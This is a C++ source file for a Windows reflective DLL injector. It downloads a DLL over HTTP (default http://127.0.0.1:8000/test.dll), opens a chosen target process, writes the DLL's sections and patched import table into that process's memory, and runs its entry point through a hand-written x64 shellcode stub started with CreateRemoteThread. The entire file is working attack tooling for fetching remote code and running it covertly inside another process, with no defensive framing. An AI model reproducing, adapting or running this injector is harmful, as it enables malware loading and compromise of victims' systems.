// injectorReflectiveNew.cpp
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// =====================================================
// Helpers
// =====================================================
static std::wstring ToWide(const std::string& s)
{
    if (s.empty()) return std::wstring();
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0);
    std::wstring w(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], len);
    return w;
}

static DWORD GetProcessIdByName(const std::wstring& processName)
{
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

// =====================================================
// Download a file over HTTP/HTTPS into a byte vector.
// Uses WinHTTP (winhttp.dll) — no extra runtime deps.
// =====================================================
static bool DownloadFileToBuffer(const std::wstring& url,
    std::vector<BYTE>& out)
{
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);

    wchar_t hostName[256] = { 0 };
    wchar_t urlPath[2048] = { 0 };
    uc.lpszHostName = hostName;
    uc.dwHostNameLength = _countof(hostName);
    uc.lpszUrlPath = urlPath;
    uc.dwUrlPathLength = _countof(urlPath);

    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &uc)) {
        std::cerr << "[!] WinHttpCrackUrl failed. Error: "
            << GetLastError() << "\n";
        return false;
    }

    bool secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hSession = WinHttpOpen(
        L"ReflectiveInjector/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        std::cerr << "[!] WinHttpOpen failed. Error: "
            << GetLastError() << "\n";
        return false;
    }

    HINTERNET hConnect = WinHttpConnect(
        hSession, hostName, uc.nPort, 0);

    if (!hConnect) {
        std::cerr << "[!] WinHttpConnect failed. Error: "
            << GetLastError() << "\n";
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        urlPath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        secure ? WINHTTP_FLAG_SECURE : 0);

    if (!hRequest) {
        std::cerr << "[!] WinHttpOpenRequest failed. Error: "
            << GetLastError() << "\n";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    {
        std::cerr << "[!] WinHttpSendRequest failed. Error: "
            << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        std::cerr << "[!] WinHttpReceiveResponse failed. Error: "
            << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode, &statusSize,
        WINHTTP_NO_HEADER_INDEX);

    if (statusCode != 200) {
        std::cerr << "[!] HTTP status " << statusCode
            << " (expected 200)\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    out.clear();
    BYTE buffer[8192];
    DWORD bytesRead = 0;

    do {
        bytesRead = 0;
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
            std::cerr << "[!] WinHttpReadData failed. Error: "
                << GetLastError() << "\n";
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        if (bytesRead > 0) {
            out.insert(out.end(), buffer, buffer + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (out.empty()) {
        std::cerr << "[!] Downloaded 0 bytes\n";
        return false;
    }

    return true;
}

// =====================================================
// Write a small x64 stub in the target that calls
//   DllMain(hinst, DLL_PROCESS_ATTACH, NULL)
// The stub receives remoteBase from CreateRemoteThread's
// lpParameter, which lands in RCX.
// =====================================================
static DWORD_PTR WriteDllMainStub(HANDLE hProcess,
    DWORD_PTR /*remoteBase*/,
    DWORD_PTR remoteEntry)
{
    // x64 machine code:
    //   mov rdx, 1                48 C7 C2 01 00 00 00
    //   xor r8, r8                4D 31 C0
    //   mov rax, <remoteEntry>    48 B8 <8-byte imm>
    //   call rax                  FF D0
    //   ret                       C3
    BYTE stub[] = {
        0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,
        0x4D, 0x31, 0xC0,
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
        0xFF, 0xD0,
        0xC3
    };
    memcpy(&stub[12], &remoteEntry, sizeof(DWORD_PTR));

    LPVOID remoteStub = VirtualAllocEx(
        hProcess, NULL, sizeof(stub),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!remoteStub) {
        std::cerr << "[!] VirtualAllocEx (stub) failed. Error: "
            << GetLastError() << "\n";
        return 0;
    }

    if (!WriteProcessMemory(hProcess, remoteStub, stub, sizeof(stub), NULL)) {
        std::cerr << "[!] WriteProcessMemory (stub) failed. Error: "
            << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
        return 0;
    }

    return (DWORD_PTR)remoteStub;
}

// =====================================================
// Reflective mapping — RVA -> file offset, exact base required
// =====================================================
static bool ReflectiveInject(HANDLE hProcess,
    const std::vector<BYTE>& dllBytes,
    DWORD_PTR& outRemoteBase)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[!] Not a valid PE (missing MZ)\n";
        return false;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[!] Not a valid PE (missing PE signature)\n";
        return false;
    }

    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        std::cerr << "[!] DLL is not x64 (Machine=0x" << std::hex
            << nt->FileHeader.Machine << std::dec << ")\n";
        return false;
    }

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    DWORD_PTR preferredBase = nt->OptionalHeader.ImageBase;

    std::cout << "[*] Image size      : 0x" << std::hex
        << imageSize << std::dec << "\n";
    std::cout << "[*] Preferred base  : 0x" << std::hex
        << preferredBase << std::dec << "\n";

    // RVA -> file-offset helper
    auto RvaToFilePtr = [&](DWORD rva) -> const BYTE* {
        if (rva < nt->OptionalHeader.SizeOfHeaders)
            return dllBytes.data() + rva;

        PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            DWORD va = s->VirtualAddress;
            DWORD size = s->SizeOfRawData;
            if (rva >= va && rva < va + size) {
                return dllBytes.data() + s->PointerToRawData + (rva - va);
            }
        }
        return nullptr;
    };

    // Allocate at preferred base ONLY
    LPVOID remoteBase = VirtualAllocEx(
        hProcess, (LPVOID)preferredBase, imageSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!remoteBase) {
        DWORD err = GetLastError();
        std::cerr << "[!] VirtualAllocEx at 0x" << std::hex << preferredBase
            << std::dec << " failed. Error: " << err << "\n";
        if (err == ERROR_INVALID_ADDRESS) {
            std::cerr << "[!] Address already in use — target already injected.\n";
        }
        return false;
    }

    if ((DWORD_PTR)remoteBase != preferredBase) {
        std::cerr << "[!] VirtualAllocEx returned 0x" << std::hex
            << (DWORD_PTR)remoteBase << " not 0x" << preferredBase
            << std::dec << "\n";
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }

    outRemoteBase = (DWORD_PTR)remoteBase;
    std::cout << "[*] Remote base     : 0x" << std::hex
        << outRemoteBase << std::dec << " (exact match)\n";

    // Write PE headers
    if (!WriteProcessMemory(hProcess, remoteBase,
        dllBytes.data(),
        nt->OptionalHeader.SizeOfHeaders, NULL))
    {
        std::cerr << "[!] WriteProcessMemory (headers) failed. Error: "
            << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }

    // Write sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;

        LPVOID remoteSection = (LPVOID)((DWORD_PTR)remoteBase + sec->VirtualAddress);
        LPVOID localSection = (LPVOID)(dllBytes.data() + sec->PointerToRawData);

        if (!WriteProcessMemory(hProcess, remoteSection, localSection,
            sec->SizeOfRawData, NULL))
        {
            std::cerr << "[!] WriteProcessMemory (section " << i
                << ") failed. Error: " << GetLastError() << "\n";
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return false;
        }
    }
    std::cout << "[*] Sections copied\n";

    // Resolve imports
    IMAGE_DATA_DIRECTORY impDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (impDir.Size > 0) {
        const BYTE* impPtr = RvaToFilePtr(impDir.VirtualAddress);
        if (!impPtr) {
            std::cerr << "[!] Import directory RVA not mapped\n";
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return false;
        }

        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)impPtr;

        for (; imp->Name != 0; imp++) {
            const BYTE* namePtr = RvaToFilePtr(imp->Name);
            if (!namePtr) {
                std::cerr << "[!] Import name RVA not mapped\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }
            const char* libName = (const char*)namePtr;
            std::cout << "[*] Import library: " << libName << "\n";

            HMODULE hLib = LoadLibraryA(libName);
            if (!hLib) {
                std::cerr << "[!] LoadLibraryA('" << libName
                    << "') failed. Error: " << GetLastError() << "\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }

            const BYTE* thunkPtr = RvaToFilePtr(imp->FirstThunk);
            if (!thunkPtr) {
                std::cerr << "[!] FirstThunk RVA not mapped\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }

            PIMAGE_THUNK_DATA localThunk = (PIMAGE_THUNK_DATA)thunkPtr;
            DWORD_PTR remoteThunkAddr = (DWORD_PTR)remoteBase + imp->FirstThunk;

            for (int k = 0; localThunk[k].u1.AddressOfData != 0; k++) {
                DWORD_PTR resolved = 0;

                if (IMAGE_SNAP_BY_ORDINAL(localThunk[k].u1.Ordinal)) {
                    WORD ord = (WORD)IMAGE_ORDINAL(localThunk[k].u1.Ordinal);
                    resolved = (DWORD_PTR)GetProcAddress(
                        hLib, (LPCSTR)(ULONG_PTR)ord);
                }
                else {
                    const BYTE* byNamePtr =
                        RvaToFilePtr((DWORD)localThunk[k].u1.AddressOfData);
                    if (!byNamePtr) {
                        std::cerr << "[!] Hint/name RVA not mapped\n";
                        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                        return false;
                    }
                    PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)byNamePtr;
                    resolved = (DWORD_PTR)GetProcAddress(hLib, byName->Name);
                }

                if (!resolved) {
                    std::cerr << "[!] Failed to resolve import from '"
                        << libName << "' (index " << k << ")\n";
                    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                    return false;
                }

                DWORD_PTR slot = remoteThunkAddr + k * sizeof(DWORD_PTR);
                if (!WriteProcessMemory(hProcess, (LPVOID)slot,
                    &resolved, sizeof(DWORD_PTR), NULL))
                {
                    std::cerr << "[!] WriteProcessMemory (IAT) failed. Error: "
                        << GetLastError() << "\n";
                    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                    return false;
                }
            }
        }
        std::cout << "[*] Imports resolved\n";
    }
    else {
        std::cout << "[*] No imports to resolve\n";
    }

    return true;
}

// =====================================================
// main — accepts <processName|pid> [dllUrlOrPath]
// =====================================================
int main(int argc, char* argv[])
{
    std::wstring targetProcess = L"cmd.exe";
    std::wstring dllSource = L"http://127.0.0.1:8000/test.dll";
    DWORD explicitPid = 0;

    if (argc >= 2) {
        std::string first = argv[1];
        bool numeric = !first.empty() &&
            first.find_first_not_of("0123456789") == std::string::npos;
        if (numeric) {
            try { explicitPid = (DWORD)std::stoul(first); }
            catch (...) { std::cerr << "[!] Invalid PID\n"; return 1; }
        }
        else {
            targetProcess = ToWide(first);
        }
    }
    if (argc >= 3) dllSource = ToWide(argv[2]);

    std::wcout << L"[*] Target process : "
        << (explicitPid ? std::to_wstring(explicitPid) : targetProcess)
        << L"\n";
    std::wcout << L"[*] DLL source     : " << dllSource << L"\n";

    // --- Download the DLL over HTTP ---
    std::vector<BYTE> dllBytes;
    if (!DownloadFileToBuffer(dllSource, dllBytes)) {
        std::wcerr << L"[!] Failed to download DLL from: " << dllSource << L"\n";
        return 1;
    }
    std::cout << "[*] DLL downloaded: " << dllBytes.size() << " bytes\n";

    // --- Find target ---
    DWORD pid = explicitPid ? explicitPid : GetProcessIdByName(targetProcess);
    if (pid == 0) {
        std::wcerr << L"[!] Could not find process: " << targetProcess << L"\n";
        return 1;
    }
    std::wcout << L"[+] Found target PID: " << pid << L"\n";

    // --- Open the target ---
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        std::cerr << "[!] OpenProcess failed. Error: " << GetLastError() << "\n";
        std::cerr << "[!] Run this injector as Administrator.\n";
        return 1;
    }

    // --- Reflective map ---
    DWORD_PTR remoteBase = 0;
    if (!ReflectiveInject(hProcess, dllBytes, remoteBase)) {
        std::cerr << "[!] Reflective mapping failed.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // --- Compute remote entry point ---
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    DWORD_PTR remoteEntry = remoteBase + entryRVA;

    std::cout << "[*] Entry RVA       : 0x" << std::hex << entryRVA << std::dec << "\n";
    std::cout << "[*] Remote entry    : 0x" << std::hex << remoteEntry << std::dec << "\n";

    // --- Write the DllMain stub ---
    DWORD_PTR remoteStub = WriteDllMainStub(hProcess, remoteBase, remoteEntry);
    if (!remoteStub) {
        std::cerr << "[!] Failed to write remote stub.\n";
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Remote stub     : 0x" << std::hex << remoteStub << std::dec << "\n";

    // --- Dispatch ---
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteStub,
        (LPVOID)(DWORD_PTR)remoteBase,
        0, NULL);

    if (!hThread) {
        std::cerr << "[!] CreateRemoteThread failed. Error: "
            << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    // The payload thread parks itself inside DllMain,
    // so we only wait a few seconds — the thread never exits.
    WaitForSingleObject(hThread, 3000);

    std::cout << "[+] Injection dispatched, thread parked inside target\n";
    std::cout << "[+] Target should still be alive\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
